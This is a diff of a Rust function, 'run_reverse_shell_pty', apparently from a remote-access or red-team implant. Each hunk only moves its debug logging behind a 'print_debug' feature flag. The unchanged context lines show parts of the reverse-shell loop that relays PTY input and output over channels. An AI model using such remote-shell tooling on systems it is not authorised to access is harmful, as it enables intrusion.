@@ -19,7 +19,7 @@ pub async fn run_reverse_shell_pty(
     // We will recreate the internal channels needed for the loop.
     let (internal_exit_tx, mut internal_exit_rx) = tokio::sync::mpsc::channel(1);
 
-    #[cfg(debug_assertions)]
+    #[cfg(feature = "print_debug")]
     log::info!("starting reverse_shell_pty (context={:?})", context);
 
     let context_val = match &context {
@@ -38,7 +38,7 @@ pub async fn run_reverse_shell_pty(
         })
         .await
     {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::error!("failed to send initial registration message: {_err}");
     }
 
@@ -108,7 +108,7 @@ pub async fn run_reverse_shell_pty(
             let n = match reader.read(&mut buffer[..]) {
                 Ok(n) => n,
                 Err(_err) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("failed to read pty: {_err}");
                     break;
                 }
@@ -118,12 +118,12 @@ pub async fn run_reverse_shell_pty(
                 match internal_exit_rx.try_recv() {
                     Ok(None) | Err(tokio::sync::mpsc::error::TryRecvError::Empty) => {}
                     Ok(Some(_status)) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::info!("closing output stream, pty exited: {_status}");
                         break;
                     }
                     Err(tokio::sync::mpsc::error::TryRecvError::Disconnected) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::info!("closing output stream, exit channel closed");
                     }
                 }
@@ -138,7 +138,7 @@ pub async fn run_reverse_shell_pty(
                 })
                 .await
             {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!("reverse_shell_pty output failed to queue: {_err}");
                 break;
             }
@@ -152,7 +152,7 @@ pub async fn run_reverse_shell_pty(
                 })
                 .await
             {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!("reverse_shell_pty ping failed: {_err}");
                 break;
             }
@@ -168,7 +168,7 @@ pub async fn run_reverse_shell_pty(
     // Handle Input
     loop {
         if let Ok(Some(_status)) = child.try_wait() {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::info!("closing input stream, pty exited: {_status}");
             break;
         }
@@ -184,13 +184,13 @@ pub async fn run_reverse_shell_pty(
                     })
                     .await
                 {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("reverse_shell_pty ping echo failed: {_err}");
                 }
                 continue;
             }
             if let Err(_err) = writer.write_all(&msg.data) {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!("reverse_shell_pty failed to write input: {_err}");
             }
         } else {
@@ -204,7 +204,7 @@ pub async fn run_reverse_shell_pty(
         let _ = internal_exit_tx.send(Some(s)).await;
     }
 
-    #[cfg(debug_assertions)]
+    #[cfg(feature = "print_debug")]
     log::info!("stopping reverse_shell_pty");
     Ok(())
 }
